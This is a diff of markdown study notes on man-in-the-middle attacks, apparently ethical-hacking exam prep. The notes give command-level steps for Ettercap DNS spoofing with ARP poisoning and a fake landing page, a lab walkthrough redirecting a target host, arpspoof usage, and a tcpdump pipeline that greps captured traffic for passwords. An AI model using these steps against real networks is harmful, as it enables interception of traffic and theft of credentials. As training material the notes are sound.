@@ -231,34 +231,82 @@ MITMF (Man-in-the-middle-framework)
 Ettercap
 <br>
 
-# DNS Cache Poisoning
-Ettercap: 
+# Sniffing
+
+DNS Cache Poisoning w/ Ettercap: 
 Attacker poisons ARP table with his MAC | Victim wants to go to Google.com | The attacker spoofs themself as the DNS server | Victim winds up going to a fake Google. <br>
 ```
 root# sysctl -w net.ipv4.ip_forward=1
 net.ipv4.ip_forward = 1
 ```
 ```
+root# nano /etc/ettercap/etter.conf
+#####################################
+ec_uid = 0
+ec_gid = 0
+
+(scroll down)
+
+#------------
+#   Linux
+#------------
+
+# if you use iptables:
+  (Delete the comment # from both lines)
+```
+```
 root# nano /etc/ettercap/etter.dns
 #####################################
-www.google.com   A    192.168.1.101 (Metasploit To Address)
-*.google.com.    A    192.168.1.101
+*       A    192.168.1.101 <- (Attackers Address)
 ```
+Now edit the HTML page located at /var/www/html/index.html for their landing page.
 ```
 root# ettercap -g
 
 Primary Interface -> eth1
 Start
 Scan for host
+Host List
 Victim Target 1
 Default Gateway Target 2
-Globe -> ARP Poisoning
 Manage Plugins -> dns_spoof
+Globe -> ARP Poisoning
+root# service apache2 start
 ```
-
-<br>
-Attacker sends his MAC to the victims ARP table and associates that with the Default Gateway. When the Victim wants to go to a domain the attacker receives the request and fowards it through the router to the internet. 
-
+Example:<br>
+Use Ettercap to begin sniffing and scanning for hosts.
+Set Exec (192.168.0.30) as the target machine
+Initiate DNS spoofing.
+From Exec, access rmksupplies.com.
+Complete this lab as follows:
+```
+Use Ettercap to begin sniffing and scanning for hosts as follows:
+From the Favorites bar, open Ettercap.
+Select Sniff.
+Select Unified sniffing.
+From the Network Interface drop-down list, select enp2s0.
+Select OK.
+Select Hosts and select Scan for hosts.
+Set Exec (192.168.0.30) as the target machine as follows:
+Select Hosts and select Host list.
+Under IP Address, select 192.168.0.30.
+Select Add to Target 1 to assign it as the target.
+Initiate DNS spoofing as follows:
+Select Plugins.
+Select Manage the plugins.
+Select the Plugins tab.
+Double-click dns_spoof to activate it.
+Select Mitm.
+Select ARP poisoning.
+Select Sniff remote connections.
+Select OK.
+From Exec, access rmksupplies.com as follows:
+From the top navigation tabs, select Floor 1 Overview.
+Under Executive Office, select Exec.
+From the task bar, open Chrome.
+In the URL field, type rmksupplies.com and press Enter.
+Notice that the page was redirected to RUS Office Supplies despite the web address not changing.
+```
 MITM Attack: <br>
 ArpSpoof<br>
 SSLStrip<br>
@@ -267,6 +315,7 @@ SSL Downgrade<br>
 DNS Cache Poisoning
 
 # ARP Poisoning Attack
+Attacker sends his MAC to the victims ARP table and associates that with the Default Gateway. When the Victim wants to go to a domain the attacker receives the request and fowards it through the router to the internet. <br><br>
 Make host act like Router:
 ```
 root# sysctl -w net.ipv4.ip_forward=1
@@ -278,6 +327,15 @@ root# arpspoof -i eth1 -t <target_ip> <destination_gateway>
 ```
 root# tcpdump -i eth1 port http or port ftp -l -A | egrep "pass=|password=|user=|username=|login=|pass:|password:|user:|username:|login:|pass |user |PASS |USER "
 ```
+# TCPDump
+You can do this for many things, mainly a CLI like Wireshark. Monitor traffic on the network.
+```
+root# tcpdump port 21
+listening on eth1
+```
+# SMAC 2.0 | GUI
+You can use this for spoofing MAC addresses on a network.
+
 # Sniffing
 MAC Spoofing - A common low-level security measure is port security. Port security allows only specific MAC addresses access to a switch. The goal is to ensure that only authorized devices have access to the network. A MAC address for a network interface card (NIC) is assigned by the manufacturer. This address is hard-coded directly into the NIC and can’t be changed. However, it is possible to change the MAC address of the interface driver. Let’s say you want to access a network, but the administrator has implemented port security measures. Thanks to your previous reconnaissance and scanning, you know that your target computer has access to the network, and you even know the MAC address. Using one of several software tools, you can spoof your computer’s MAC address to look like the target’s MAC address, and you can connect directly to the network with minimal effort.<br>
 
@@ -289,6 +347,31 @@ ARP Poisoning - Address Resolution Protocol (ARP) maps IP addresses to MAC addre
 
 Port Mirroring - Port mirroring can be challenging to set up, but is possible depending on the level of access you’ve been able to obtain to a network. The concept behind port mirroring, also known as SPAN port, is actually pretty simple. Port mirroring creates a duplicate of all network traffic on a port and sends it to another device. If all traffic from a target machine is directed through the switch to the server, you can implement port mirroring. Port mirroring ensures that any time the data comes through, it is duplicated and sent out to the attacker’s machine as well.<br>
 
+# Countermeasures for Sniffing
+Write packet capture files from interface 1 into mycap.pcap
+```
+c:\>windump -i 1 -w C:\test\mycap.pcap
+```
+# Session Hijacking Process
+Session ID is the key for this to work! | Happens on the Application and Network Layers |
+- Sniff
+- Monitor
+- Desynch the session
+- Predict the session ID
+- Inject commands
+
+Find Session IDs:
+- Sniff sessions
+- Predict session tokens
+- Man-in-the-middle attacks
+- Man-in-the-browser attacks
+
+TCP/IP Session Hijacking:
+- Sniff client/server traffic
+- Predict sequencing 
+- Desync client session
+- Take over the session
+
 # Network Access Control Bypass
 
 # John The Ripper
@@ -296,6 +379,15 @@ Port Mirroring - Port mirroring can be challenging to set up, but is possible de
 # Hashcat 
 
 # NMAP
+Detect Promiscuous Mode
+```
+# nmap -sV --script=sniffer-detect <ip address>
+Host script results:
+__sniffer-detect: Likely in promiscuous mode (tests: "111111")
+```
+
+# Wireshark
+
 
 
 
